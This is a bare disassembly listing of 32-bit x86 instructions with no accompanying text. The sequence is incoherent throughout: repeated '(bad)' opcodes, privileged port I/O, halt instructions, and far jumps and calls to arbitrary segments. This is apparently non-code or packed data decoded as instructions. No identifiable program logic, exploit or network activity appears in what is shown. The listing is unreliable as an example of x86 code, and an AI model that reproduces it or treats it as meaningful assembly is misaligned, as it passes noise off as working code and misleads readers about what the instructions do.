  403f1e:	loopne 0x403ea4
  403f20:	pop    ecx
  403f21:	mov    edx,0x13adef44
  403f26:	out    dx,al
  403f27:	lahf   
  403f28:	je     0x403f85
  403f2a:	rcr    BYTE PTR [esi],1
  403f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f2d:	xor    eax,0x3b52d008
  403f32:	mov    DWORD PTR ds:0xf328d5ac,eax
  403f38:	ss ss mov ch,0x6c
  403f3c:	or     al,0xe3
  403f3e:	cmp    ebx,edx
  403f40:	cwde   
  403f41:	sbb    esi,DWORD PTR [edi]
  403f43:	sub    al,0x2d
  403f45:	pop    edi
  403f46:	cmp    edi,esi
  403f48:	push   es
  403f49:	pop    es
  403f4a:	sbb    ebp,DWORD PTR [ecx+0x10]
  403f4d:	jl     0x403f05
  403f4f:	xchg   BYTE PTR [edx+0x217de75a],cl
  403f55:	pop    ecx
  403f56:	scas   eax,DWORD PTR es:[edi]
  403f57:	xor    BYTE PTR [ebp+0x51],dh
  403f5a:	iret   
  403f5b:	sbb    eax,edx
  403f5d:	out    dx,al
  403f5e:	(bad)  
  403f5f:	cmp    al,0x3d
  403f61:	out    0x9a,al
  403f63:	push   0x3b
  403f65:	pop    esp
  403f66:	xor    eax,0x9de06eff
  403f6b:	jecxz  0x403f8c
  403f6d:	lahf   
  403f6e:	lods   eax,DWORD PTR ds:[esi]
  403f6f:	jb     0x403fef
  403f71:	(bad)  
  403f72:	fmul   DWORD PTR [edx]
  403f74:	mov    ecx,0xfc71a5ec
  403f79:	hlt    
  403f7a:	xchg   cl,ah
  403f7c:	dec    eax
  403f7d:	test   eax,0x5511cbe1
  403f82:	icebp  
  403f83:	in     eax,dx
  403f84:	cmp    ch,ch
  403f86:	(bad)  [edx+ebp*8-0x3d]
  403f8a:	es stc 
  403f8c:	xor    dh,ah
  403f8e:	dec    esp
  403f8f:	(bad)  
  403f90:	cmc    
  403f91:	(bad)  
  403f93:	lea    ebp,[ebp+edi*4+0x4f823291]
  403f9a:	shr    DWORD PTR [eax+eiz*8-0x10],cl
  403f9e:	(bad)  
  403fa0:	fadd   st(4),st
  403fa2:	in     al,dx
  403fa3:	fsubr  DWORD PTR [eax+esi*1+0x3288552a]
  403faa:	in     al,dx
  403fab:	mov    ?,WORD PTR [ecx-0x37]
  403fae:	jne    0x403fea
  403fb0:	dec    esp
  403fb1:	xor    eax,0xd6949af6
  403fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fb7:	out    0x78,al
  403fb9:	aas    
  403fba:	inc    edi
  403fbb:	pop    esi
  403fbc:	in     eax,dx
  403fbd:	popf   
  403fbe:	add    eax,0x5110b3e0
  403fc3:	fisubr DWORD PTR [eax]
  403fc5:	data16 sub al,0xc5
  403fc8:	test   al,0xac
  403fca:	repz inc ebx
  403fcc:	nop
  403fcd:	loop   0x403f8e
  403fcf:	cmp    al,0xbe
  403fd1:	xor    bl,ch
  403fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fd4:	inc    esi
  403fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fd6:	ret    
  403fd7:	push   0xe1ae7e7
  403fdc:	pushf  
  403fdd:	stos   DWORD PTR es:[edi],eax
  403fde:	out    dx,al
  403fdf:	inc    esp
  403fe0:	lea    edi,[edx+0x65]
  403fe3:	push   edi
  403fe4:	push   ebp
  403fe5:	sub    eax,0x6743733d
  403fea:	inc    edx
  403feb:	cwde   
  403fec:	dec    edx
  403fed:	shl    BYTE PTR [edi],0xf5
  403ff0:	sub    cl,bl
  403ff2:	arpl   WORD PTR [esi-0x80],bx
  403ff5:	lds    edx,FWORD PTR [eax+0x1a7a666]
  403ffb:	or     ah,BYTE PTR [eax+0xa]
  403ffe:	jb     0x403fc4
  404000:	out    0x1a,al
  404002:	sub    DWORD PTR [eax],esi
  404004:	jne    0x403fc4
  404006:	pop    edx
  404007:	jno    0x404080
  404009:	in     al,0x32
  40400b:	pop    esi
  40400c:	xor    DWORD PTR ds:0xdacdc074,esp
  404012:	retf   
  404013:	pop    ebx
  404014:	ds push edi
  404016:	outs   dx,DWORD PTR ds:[esi]
  404017:	mov    al,ds:0xfd2a533e
  40401c:	pop    edi
  40401d:	cmp    BYTE PTR [edx+eiz*1],bl
  404020:	loop   0x40404b
  404022:	cmp    eax,ebx
  404024:	mov    eax,0xbb193184
  404029:	dec    ebx
  40402a:	mov    BYTE PTR [edx],bh
  40402c:	add    esp,eax
  40402e:	retf   0x833e
  404031:	cwde   
  404032:	jbe    0x40407a
  404034:	cmp    bl,BYTE PTR [ebp-0x6484bfdb]
  40403a:	mov    dl,0xeb
  40403c:	(bad)  
  40403d:	sub    ecx,DWORD PTR [edi-0x1104a5f9]
  404043:	inc    esi
  404044:	mov    bh,0x1
  404046:	push   ecx
  404047:	mov    edx,0x8454bfd9
  40404c:	lahf   
  40404d:	retf   0xe33e
  404050:	mov    esi,0x1779860d
  404055:	jecxz  0x4040bb
  404057:	clc    
  404058:	mov    ds:0x962c757c,al
  40405d:	push   ebx
  40405e:	mov    edi,0xb5d0f3fa
  404063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404064:	cmp    DWORD PTR [edx+0x4a334848],edx
  40406a:	aad    0x66
  40406c:	(bad)  
  40406d:	leave  
  40406e:	test   bl,0x9e
  404071:	retf   
  404072:	mov    WORD PTR [ecx+0x32b1dd6e],es
  404078:	mov    edi,0xbb85afd
  40407d:	and    ch,BYTE PTR [edi-0x1995ae30]
  404083:	pop    DWORD PTR [edi]
  404085:	jge    0x4040d3
  404087:	jmp    0x8ac6:0x1c49ae8a
  40408e:	imul   BYTE PTR [ecx-0x75]
  404091:	imul   esp,esp,0x49
  404094:	add    eax,0x8a0d2b3f
  404099:	pop    ecx
  40409a:	inc    edi
  40409b:	sub    ah,bl
  40409d:	dec    ebx
  40409e:	and    al,0x47
  4040a0:	outs   dx,DWORD PTR ds:[esi]
  4040a1:	icebp  
  4040a2:	(bad)  
  4040a3:	loope  0x404042
  4040a5:	push   ebp
  4040a6:	mov    ebx,0x6b250b67
  4040ab:	call   FWORD PTR [ecx-0x33]
  4040ae:	adc    eax,0x3e39095d
  4040b3:	add    al,0xcd
  4040b5:	cmc    
  4040b6:	int3   
  4040b7:	aad    0x63
  4040b9:	inc    eax
  4040ba:	scas   eax,DWORD PTR es:[edi]
  4040bb:	pop    esi
  4040bc:	imul   ecx,DWORD PTR [edi-0x14],0x25c04eb
  4040c3:	xor    edi,DWORD PTR [eax]
  4040c5:	cmp    eax,0x307f8978
  4040ca:	gs test al,0xd0
  4040cd:	leave  
  4040ce:	adc    eax,0x755d46e5
  4040d3:	inc    esp
  4040d4:	xlat   BYTE PTR ds:[ebx]
  4040d5:	dec    ecx
  4040d6:	jmp    0xec6267cf
  4040db:	bound  eax,QWORD PTR [ecx+0x14]
  4040de:	xchg   DWORD PTR [eax+esi*2+0x5c],ebx
  4040e2:	outs   dx,BYTE PTR ds:[esi]
  4040e3:	ja     0x40411e
  4040e5:	push   esi
  4040e6:	bound  ecx,QWORD PTR [ebx+0x6c]
  4040e9:	xchg   edi,eax
  4040ea:	sbb    ah,BYTE PTR [ecx]
  4040ec:	push   edx
  4040ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ee:	jmp    0x4040c5
  4040f0:	cmp    DWORD PTR [esi+0x3d],0x45f1591d
  4040f7:	and    DWORD PTR [ecx],0xffffff89
  4040fa:	out    0x89,al
  4040fc:	jmp    0x49a6a732
  404101:	xchg   esp,eax
  404102:	addr16 mov dl,0x10
  404105:	imul   ecx,DWORD PTR [edx+0x6d985c67],0xb6ce4064
  40410f:	(bad)  
  404110:	adc    eax,0x58f0e655
  404115:	outs   dx,BYTE PTR ds:[esi]
  404116:	int    0x67
  404118:	out    0x7,al
  40411a:	mov    ebx,0xf14335a2
  40411f:	(bad)  
  404120:	adc    eax,0x887cfddb
  404125:	ficom  WORD PTR [ebx+ebp*4+0xbd4446c]
  40412c:	and    al,0x38
  40412e:	and    BYTE PTR [edx+esi*2-0x6a],0x9e
  404133:	jb     0x404152
  404135:	in     al,dx
  404136:	mov    eax,0xc80e5794
  40413b:	hlt    
  40413c:	test   al,0xda
  40413e:	push   ss
  40413f:	push   edx
  404140:	int    0x82
  404142:	xchg   BYTE PTR [esi+ebp*2+0x36],cl
  404146:	xor    BYTE PTR [esi],al
  404148:	ss dec ebx
  40414a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40414b:	dec    edi
  40414c:	pop    esp
  40414d:	enter  0x4c05,0x4b
  404151:	sub    al,0x35
  404153:	inc    ebp
  404154:	add    eax,0x85463713
  404159:	xchg   edx,eax
  40415a:	push   esp
  40415b:	loop   0x404172
  40415d:	add    edi,DWORD PTR [edi]
  40415f:	out    0x70,al
  404161:	adc    DWORD PTR [esi],edx
  404163:	jge    0x404157
  404165:	add    ebp,DWORD PTR [edi]
  404167:	push   ebx
  404168:	jo     0x40410c
  40416a:	in     eax,dx
  40416b:	pop    edx
  40416c:	nop
  40416d:	xlat   BYTE PTR ds:[ebx]
  40416e:	xchg   ebx,eax
  40416f:	lock mov edi,0x1e1be0e7
  404175:	xlat   BYTE PTR ds:[ebx]
  404176:	inc    edi
  404177:	les    ebp,FWORD PTR [ebx-0x36303b7c]
  40417d:	cwde   
  40417e:	cli    
  40417f:	pop    edx
  404180:	cmp    dh,al
  404182:	cdq    
  404183:	out    0x28,eax
  404185:	sub    eax,DWORD PTR [edi+0x6951bdee]
  40418b:	inc    edi
  40418c:	pop    esp
  40418d:	push   ebx
  40418e:	test   BYTE PTR [ebx],ah
  404190:	adc    edx,DWORD PTR [ebp-0x1]
  404193:	and    BYTE PTR [esi+0x1a],0x8f
  404197:	sub    al,0x70
  404199:	mov    al,0xda
  40419b:	and    eax,0x523eaae6
  4041a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041a1:	jmp    0x5c6a:0x52938847
  4041a8:	add    DWORD PTR [ecx-0x5df46daf],edi
  4041ae:	and    eax,0xde68fd60
  4041b3:	cmp    al,0xd7
  4041b5:	mov    cl,0x89
  4041b7:	mov    dh,0x64
  4041b9:	jno    0x4041db
  4041bb:	cwde   
  4041bc:	and    DWORD PTR [ecx+eiz*1],esp
  4041bf:	mov    edx,0x20cc2cf9
  4041c4:	jns    0x4041d2
  4041c6:	push   bp
  4041c8:	xor    ch,BYTE PTR [ebx+0x7d]
  4041cb:	fcmovu st,st(2)
  4041cd:	cli    
  4041ce:	add    al,0x4d
  4041d0:	adc    eax,0x4cca24b8
  4041d5:	mov    ecx,0x8291c0b5
  4041da:	sti    
  4041db:	fwait
  4041dc:	shl    DWORD PTR [ebx],0x9b
  4041df:	sbb    DWORD PTR [esi],edi
  4041e1:	rol    BYTE PTR gs:[ebx],1
  4041e4:	jl     0x40420e
  4041e6:	push   ds
  4041e7:	jne    0x40420f
  4041e9:	leave  
  4041ea:	(bad)  
  4041eb:	fcomp  DWORD PTR [ebx]
  4041ed:	scas   eax,DWORD PTR es:[edi]
  4041ee:	jne    0x40417e
  4041f0:	jmp    0x404219
  4041f2:	les    ebp,FWORD PTR [ebp-0x7383045c]
  4041f8:	xchg   al,bh
  4041fa:	fdivr  DWORD PTR [esi+eax*1]
  4041fd:	add    al,0xaa
  4041ff:	adc    esp,DWORD PTR ds:0x8626dd70
  404205:	jo     0x4041e5
  404207:	push   es
  404208:	(bad)  
  404209:	cmp    DWORD PTR [esi-0x618f4453],ebp
  40420f:	scas   eax,DWORD PTR es:[edi]
  404210:	in     eax,0x2f
  404212:	test   eax,0xc992567d
  404217:	ficom  DWORD PTR [ecx+0x63]
  40421a:	and    al,0x43
  40421c:	fs xchg ebx,eax
  40421e:	pop    ebp
  40421f:	out    0x5f,eax
  404221:	jmp    0xa2c3:0x4891fe2d
  404228:	sub    BYTE PTR [ebx-0x73],0xc6
  40422c:	jle    0x404297
  40422e:	jg     0x40422e
  404230:	push   cs
  404231:	pop    edx
  404232:	cmp    al,0xdf
  404234:	test   BYTE PTR ds:0x538b1c10,ch
  40423a:	or     BYTE PTR [eax-0x4e],ch
  40423d:	jb     0x404214
  40423f:	aad    0xcd
  404241:	push   es
  404242:	pushf  
  404243:	enter  0x88ce,0x58
  404247:	lods   eax,DWORD PTR gs:[esi]
  404249:	lods   al,BYTE PTR ds:[esi]
  40424a:	mov    WORD PTR [edx-0x77253459],es
  404250:	sub    al,0xf7
  404252:	push   ecx
  404253:	inc    eax
  404254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	hlt    
  404257:	pop    es
  404258:	in     eax,0xd7
  40425a:	lods   eax,DWORD PTR ds:[esi]
  40425b:	cmp    al,bh
  40425d:	mov    esp,0x764576ac
  404262:	int    0xb7
  404264:	call   0x7ff7:0x7c84ca68
  40426b:	xor    DWORD PTR [eax],ebx
  40426d:	mov    eax,ds:0x406aa0d8
  404272:	cmp    eax,edi
  404274:	out    0x2b,eax
  404276:	into   
  404277:	push   es
  404278:	pushf  
  404279:	out    0x59,eax
  40427b:	outs   dx,BYTE PTR ds:[esi]
  40427c:	(bad)  [ecx+0x310fcf1c]
  404282:	dec    edi
  404283:	out    0x41,al
  404285:	pusha  
  404286:	test   al,0x5
  404288:	jg     0x404278
  40428a:	xor    DWORD PTR [edi+0x0],esp
  40428d:	add    ebx,DWORD PTR ds:0x796159d5
  404293:	cmc    
  404294:	dec    ebx
  404295:	sar    DWORD PTR ds:0xc0f4a84c,0x3e
  40429c:	xchg   edx,eax
  40429d:	je     0x4042f6
  40429f:	or     eax,DWORD PTR [ebx-0x39d6253a]
  4042a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042a6:	sbb    al,0xec
  4042a8:	dec    edx
  4042a9:	sub    BYTE PTR [ebx-0x424980f9],0xd
  4042b0:	inc    ebp
  4042b1:	iret   
  4042b2:	push   edi
  4042b3:	add    ch,ah
  4042b5:	mov    edx,0x1e88be4
  4042ba:	xor    DWORD PTR [eax],edx
  4042bc:	(bad)  
  4042bd:	loopne 0x4042c8
  4042bf:	out    dx,eax
  4042c0:	jb     0x4042fd
  4042c2:	ins    BYTE PTR es:[edi],dx
  4042c3:	mov    eax,0xc6501f53
  4042c8:	(bad)  
  4042c9:	outs   dx,DWORD PTR ds:[esi]
  4042ca:	(bad)  
  4042cc:	and    BYTE PTR [ebp+0x4f52a593],0xf2
  4042d3:	ja     0x4042a8
  4042d5:	or     al,0xfc
  4042d7:	shl    BYTE PTR [ebx*1+0x22d420de],cl
  4042de:	mov    edx,0x59957872
  4042e3:	out    0xbd,al
  4042e5:	inc    ebp
  4042e6:	fiadd  DWORD PTR [esp+eiz*4+0x60]
  4042ea:	fsub   QWORD PTR [edi-0x2c]
  4042ed:	stos   BYTE PTR es:[edi],al
  4042ee:	mov    al,ds:0xf1429393
  4042f3:	(bad)
  4042f6:	mov    al,0x64
  4042f8:	sub    BYTE PTR [eax+0x79b2672],dl
  4042fe:	push   edx
  4042ff:	shl    eax,1
  404301:	stos   BYTE PTR es:[edi],al
  404302:	stos   BYTE PTR es:[edi],al
  404303:	repz rcl DWORD PTR [edx+0x492d035a],0xa6
  40430b:	out    dx,al
  40430c:	sti    
  40430d:	mov    cl,0xc3
  40430f:	pop    ds
  404310:	out    dx,eax
  404311:	shr    DWORD PTR [esi-0x69c67518],1
  404317:	push   edx
  404318:	xchg   ebx,eax
  404319:	fwait
  40431a:	inc    ebx
  40431b:	push   ebx
  40431c:	(bad)  
  40431d:	lea    eax,ds:0xc5975cc0
  404323:	sbb    al,0xa1
  404325:	push   ecx
  404326:	mov    al,0x6e
  404328:	bound  ebp,QWORD PTR [esi-0x5dddf9fa]
  40432e:	inc    esp
  40432f:	cmc    
  404330:	pushf  
  404331:	jmp    0x709a:0x8b7fd63
  404338:	pop    ss
  404339:	aad    0xc1
  40433b:	mov    dl,0x4f
  40433d:	jg     0x404320
  40433f:	out    0xf5,eax
  404341:	pop    esi
  404342:	jg     0x404340
  404344:	neg    BYTE PTR [eax]
  404346:	pop    edi
  404347:	in     al,dx
  404348:	rcr    cl,cl
  40434a:	iret   
  40434b:	mov    dh,0x20
  40434d:	ret    0x54e7
  404350:	push   cs
  404351:	jb     0x404370
  404353:	sub    edx,DWORD PTR ds:0x99d4d35f
  404359:	inc    edi
  40435a:	aam    0xfd
  40435c:	loopne 0x4043d0
  40435e:	clc    
  40435f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404360:	fcomp  DWORD PTR [edx]
  404362:	jne    0x404338
  404364:	and    eax,0xea3eb32f
  404369:	dec    edi
  40436a:	(bad)  
  40436b:	iret   
  40436c:	and    eax,0x8396f77f
  404371:	inc    edi
  404372:	mov    ds:0xb958af63,eax
  404377:	das    
  404378:	sti    
  404379:	and    al,0xda
  40437b:	mov    edx,DWORD PTR [esi]
  40437d:	cmp    BYTE PTR [edx+0x53],al
  404380:	fsubr  QWORD PTR [eax]
  404382:	div    BYTE PTR [eax]
  404384:	(bad)  
  404386:	enter  0xc6ed,0xd5
  40438a:	push   0xc6ec25da
  40438f:	sti    
  404390:	or     BYTE PTR [esi+ebp*2+0x696db4a6],bl
  404397:	cwde   
  404398:	test   eax,0x400b0b5a
  40439d:	mov    ds:0x76502cb3,eax
  4043a2:	dec    esi
  4043a3:	(bad)  
  4043a4:	xlat   BYTE PTR ds:[ebx]
  4043a5:	xor    al,0x15
  4043a7:	pop    ebx
  4043a8:	push   0xffffffc3
  4043aa:	and    eax,DWORD PTR [ebp-0x2f0ac3dc]
  4043b0:	les    ebp,FWORD PTR [esi-0x1c]
  4043b3:	inc    DWORD PTR [edx+0x6f45c515]
  4043b9:	or     cl,ch
  4043bb:	mov    al,0x58
  4043bd:	aaa    
  4043be:	sbb    bl,BYTE PTR [eax+0x4f]
  4043c1:	in     al,0xca
  4043c3:	mov    cl,0xfb
  4043c5:	xchg   esi,eax
  4043c6:	repz test DWORD PTR [eax+0x7c490df1],esi
  4043cd:	(bad)  
  4043ce:	scas   eax,DWORD PTR es:[edi]
  4043cf:	daa    
  4043d0:	xor    DWORD PTR [esi-0x6e],esp
  4043d3:	in     eax,dx
  4043d4:	and    al,0x22
  4043d6:	dec    edi
  4043d7:	mov    WORD PTR [eax-0x2a],cs
  4043da:	sbb    eax,0x4760c506
  4043df:	pushf  
  4043e0:	test   ebx,esp
  4043e2:	xchg   ebx,eax
  4043e3:	add    edx,DWORD PTR [ebx+0x8c1c6e6]
  4043e9:	and    eax,0x3e5499f
  4043ee:	jmp    0x404420
  4043f0:	test   al,0xaa
  4043f2:	mov    DWORD PTR [ebp+0x78],edx
  4043f5:	sbb    eax,0x1e3dca24
  4043fa:	mov    edx,0x8a496a5b
  4043ff:	xchg   esi,eax
  404400:	pop    ebx
  404401:	and    ecx,DWORD PTR ss:[edi+ebp*4-0x50]
  404406:	loop   0x404433
  404408:	and    ebp,ebx
  40440a:	or     dl,ch
  40440c:	mov    cl,0xac
  40440e:	and    DWORD PTR [edx],ebx
  404410:	out    dx,al
  404411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404412:	mul    DWORD PTR [edi+0x424f6c80]
  404418:	lods   eax,DWORD PTR ds:[esi]
  404419:	data16 ja 0x404407
  40441c:	cmp    DWORD PTR [esi],ebp
  40441e:	outs   dx,DWORD PTR ds:[esi]
  40441f:	nop
  404420:	lods   eax,DWORD PTR ds:[esi]
  404421:	mov    dh,0x90
  404423:	test   eax,0x6a845362
  404428:	daa    
  404429:	pop    edi
  40442a:	mov    al,0xdb
  40442c:	sbb    BYTE PTR [ecx-0x59a3ef94],dl
  404432:	push   0x0
  404434:	inc    edx
  404435:	cs in  eax,0x27
  404438:	scas   eax,DWORD PTR es:[edi]
  404439:	adc    BYTE PTR [eax],ch
  40443b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40443c:	lea    ebx,[ebx+0x658f0ed0]
  404442:	dec    esi
  404443:	test   al,0xb8
  404445:	dec    ebx
  404446:	and    al,0xb5
  404448:	lahf   
  404449:	fs sbb ebx,edx
  40444c:	pop    es
  40444d:	jg     0x404419
  40444f:	nop
  404450:	and    BYTE PTR [ecx],dh
  404452:	jnp    0x4043dd
  404454:	push   esp
  404455:	mov    ecx,0xe737ef2b
  40445a:	push   esp
  40445b:	push   eax
  40445c:	push   cs
  40445d:	loopne 0x404488
  40445f:	icebp  
  404460:	mov    al,0x15
  404462:	ds xor eax,0x1954e775
  404468:	jae    0x4044c1
  40446a:	(bad)  
  40446b:	push   0x4b
  40446d:	daa    
  40446e:	dec    esp
  40446f:	sbb    cl,al
  404471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404472:	arpl   sp,bx
  404474:	test   al,0x1b
  404476:	dec    ebx
  404477:	cmp    eax,0xf5451dd3
  40447c:	xor    al,0x38
  40447e:	test   BYTE PTR [ebx-0x25792b33],dh
  404484:	xchg   ebp,eax
  404485:	sti    
  404486:	fnstcw WORD PTR [eax-0x47]
  404489:	pop    esp
  40448a:	and    eax,0x55926756
  40448f:	push   cs
  404490:	push   0x7b
  404492:	stos   BYTE PTR es:[edi],al
  404493:	dec    ebp
  404494:	gs add al,0x3e
  404497:	mov    bl,0x1c
  404499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40449a:	idiv   DWORD PTR [edi-0x759fcee7]
  4044a0:	cmpps  xmm1,XMMWORD PTR [ebx-0xfa8abec],0xf4
  4044a8:	sbb    eax,0x767435e9
  4044ad:	das    
  4044ae:	sbb    esi,DWORD PTR [ebx+ecx*8-0x78]
  4044b2:	mov    ds:0x609f82a9,al
  4044b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044b8:	stos   BYTE PTR es:[edi],al
  4044b9:	or     bh,BYTE PTR [ebp-0x2b]
  4044bc:	ins    BYTE PTR es:[edi],dx
  4044bd:	add    al,BYTE PTR [ecx+edi*4-0x2a17666b]
  4044c4:	xchg   ebp,eax
  4044c5:	fwait
  4044c6:	mov    DWORD PTR [edi],ebx
  4044c8:	adc    DWORD PTR [ebx],ecx
  4044ca:	mov    ah,0x3c
  4044cc:	cwde   
  4044cd:	scas   al,BYTE PTR es:[edi]
  4044ce:	sub    edi,ecx
  4044d0:	mov    ecx,0x94b3651c
  4044d5:	scas   eax,DWORD PTR es:[edi]
  4044d6:	pop    ebx
  4044d7:	mov    bh,0xa4
  4044d9:	test   DWORD PTR [ebx+0x82db532],esi
  4044df:	mov    ah,bh
  4044e1:	punpcklwd mm2,mm4
  4044e4:	and    ch,BYTE PTR [esi+0x5d]
  4044e7:	push   esp
  4044e8:	sub    ah,bl
  4044ea:	imul   edi,DWORD PTR [ebx-0x19],0x3e8ac36f
  4044f1:	adc    cl,BYTE PTR [ecx+0x20]
  4044f4:	outs   dx,DWORD PTR ds:[esi]
  4044f5:	sub    ebp,ebx
  4044f7:	sub    al,0x90
  4044f9:	(bad)  
  4044fa:	jl     0x4044e6
  4044fc:	shr    dl,cl
  4044fe:	cmp    ebp,esi
  404500:	in     eax,dx
  404501:	sbb    ah,BYTE PTR [esi+0x36]
  404504:	jo     0x404520
  404506:	hlt    
  404507:	inc    ecx
  404508:	or     eax,DWORD PTR [eax+eiz*8-0x4860f6b4]
  40450f:	retf   0x4734
  404512:	cmp    cl,BYTE PTR [edx+eax*2-0x27775a28]
  404519:	jns    0x40450f
  40451b:	xor    DWORD PTR [esi+0xd47351e],ebx
  404521:	data16 fimul DWORD PTR [edx+0x66]
  404525:	test   BYTE PTR [edx],dl
  404527:	mov    edi,ebp
  404529:	inc    ebp
  40452a:	pop    ebp
  40452b:	mov    ecx,DWORD PTR [edi-0x6b]
  40452e:	xchg   ebx,eax
  40452f:	fidivr WORD PTR [edi]
  404531:	bound  ecx,QWORD PTR [ebx-0x2b6b358]
  404537:	adc    eax,0xd1db6ec4
  40453c:	neg    DWORD PTR [edx+0x17]
  40453f:	call   0xc80f:0x53acbff5
  404546:	outs   dx,BYTE PTR ds:[esi]
  404547:	sub    al,0x68
  404549:	mov    bh,0x95
  40454b:	enter  0x4364,0xa8
  40454f:	call   0xa5ac0993
  404554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404555:	dec    eax
  404556:	outs   dx,DWORD PTR ds:[esi]
  404557:	clc    
  404558:	jae    0x404540
  40455a:	not    DWORD PTR [ecx+ecx*8]
  40455d:	and    edi,DWORD PTR [ecx+0x5c57d560]
  404563:	int3   
  404564:	popa   
  404565:	retf   0xd131
  404568:	sbb    eax,0x3375f8d3
  40456d:	xor    BYTE PTR [ecx-0x4912c4bf],bl
  404573:	cmp    DWORD PTR [esi],ebx
  404575:	sub    eax,0xa10c1776
  40457a:	add    DWORD PTR [ebx+edx*4-0x31],0xf4b9acae
  404582:	pop    edi
  404583:	test   BYTE PTR [ebx],ah
  404585:	sbb    dl,al
  404587:	fsub   QWORD PTR [eax+0x5b]
  40458a:	jge    0x404578
  40458c:	mov    WORD PTR [eax-0x35de6afc],ds
  404592:	ja     0x404545
  404594:	mov    cl,0x19
  404596:	fwait
  404597:	mov    bh,0x5c
  404599:	(bad)  [eax]
  40459b:	jbe    0x40460c
  40459d:	inc    ecx
  40459e:	pop    edi
  40459f:	sbb    DWORD PTR [ebp-0x6e],0x1d4a0676
  4045a6:	pop    edi
  4045a7:	xchg   ebp,eax
  4045a8:	and    edi,edi
  4045aa:	jnp    0x404585
  4045ac:	cmp    BYTE PTR [edi+0x1b],cl
  4045af:	and    eax,0xf299cf22
  4045b4:	ret    0xb140
  4045b7:	xchg   ecx,eax
  4045b8:	pop    ds
  4045b9:	shl    BYTE PTR [edi-0x792f4e31],1
  4045bf:	dec    esp
  4045c0:	ja     0x40455a
  4045c2:	inc    ecx
  4045c3:	(bad)  
  4045c4:	cld    
  4045c5:	js     0x4045e0
  4045c7:	pop    edi
  4045c8:	sti    
  4045c9:	ja     0x404615
  4045cb:	cmp    al,0x18
  4045cd:	pusha  
  4045ce:	jecxz  0x40455f
  4045d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045d1:	push   ecx
  4045d2:	lds    eax,FWORD PTR [ebp+0x6]
  4045d5:	jo     0x4045b4
  4045d7:	fnstsw WORD PTR [edi+0xe0cac7a]
  4045dd:	sbb    DWORD PTR [edx+0x678b3ce3],0x54
  4045e4:	add    DWORD PTR [edi+edi*1+0x1ef6d217],0x4f
  4045ec:	xchg   ecx,eax
  4045ed:	push   ss
  4045ee:	adc    BYTE PTR [esp+ebp*8-0x42],dl
  4045f2:	rcl    BYTE PTR [ebx-0x79b0201c],0xb3
  4045f9:	mov    dl,0x85
  4045fb:	ret    
  4045fc:	xchg   ebx,eax
  4045fd:	cwde   
  4045fe:	xor    bh,BYTE PTR [esi+0x5da9875b]
  404604:	out    0x10,al
  404606:	and    al,0x42
  404608:	sub    DWORD PTR [eax+eax*4],ebx
  40460b:	jns    0x4045f0
  40460d:	shr    ecx,1
  40460f:	push   ebx
  404610:	ds sub bl,bl
  404613:	jmp    0x40461d
  404615:	push   es
  404616:	(bad)  
  404617:	pop    eax
  404618:	pushf  
  404619:	mov    WORD PTR [eax],cs
  40461b:	push   edx
  40461c:	out    dx,al
  40461d:	popf   
  40461e:	adc    al,0x84
  404620:	mov    al,ds:0x7ef79983
  404625:	mov    esp,0xa3e8b124
  40462a:	jbe    0x40465e
  40462c:	push   cs
  40462d:	lods   eax,DWORD PTR ds:[esi]
  40462e:	ret    
  40462f:	adc    ebp,ebp
  404631:	inc    esi
  404632:	push   0x13
  404634:	add    DWORD PTR [eax-0x2d9f7d25],ebx
  40463a:	cmp    eax,0x930428fa
  40463f:	stos   BYTE PTR es:[edi],al
  404640:	pop    edx
  404641:	dec    esp
  404642:	fisttp DWORD PTR [ebx-0x39638f6f]
  404648:	or     BYTE PTR [edx],dl
  40464a:	pop    DWORD PTR [edx-0x5f]
  40464d:	iret   
  40464e:	into   
  40464f:	xor    eax,0x492c73dd
  404654:	xor    DWORD PTR ds:0x740eb7a9,esp
  40465a:	pop    edx
  40465b:	or     ah,BYTE PTR [edi-0x6f]
  40465e:	sub    dl,BYTE PTR [ebx-0x7bc793d7]
  404664:	xchg   edx,eax
  404665:	pop    ebx
  404666:	dec    ebp
  404667:	mov    ch,0x3a
  404669:	clc    
  40466a:	stos   BYTE PTR es:[edi],al
  40466b:	sub    bh,BYTE PTR [ecx+0x2c35af93]
  404671:	mov    ebp,0x6713eb8f
  404676:	fcom   QWORD PTR [ebx-0x957e452]
  40467c:	(bad)  
  40467d:	aad    0x50
  40467f:	cdq    
  404680:	scas   al,BYTE PTR es:[edi]
  404681:	orps   xmm3,xmm4
  404684:	xchg   BYTE PTR [ebx-0x7],bl
  404687:	mov    ds:0x7f851b1a,al
  40468c:	mov    ch,0x68
  40468e:	imul   ebx,DWORD PTR [eax+0x2e36d2e],0x13
  404695:	loopne 0x40470c
  404697:	je     0x404647
  404699:	mov    bh,BYTE PTR [edx+0x77]
  40469c:	dec    ebx
  40469d:	dec    ecx
  40469e:	mov    dh,0xbc
  4046a0:	in     eax,dx
  4046a1:	push   eax
  4046a2:	in     eax,0x73
  4046a4:	aam    0xee
  4046a6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4046a8:	mov    esi,fs
  4046aa:	out    0xb8,al
  4046ac:	pop    DWORD PTR [edx]
  4046ae:	jo     0x404666
  4046b0:	ret    
  4046b1:	push   ss
  4046b2:	pushf  
  4046b3:	mov    eax,ds:0x3dd9d8b
  4046b8:	das    
  4046b9:	cmp    eax,0x20b55ec4
  4046be:	aam    0x4f
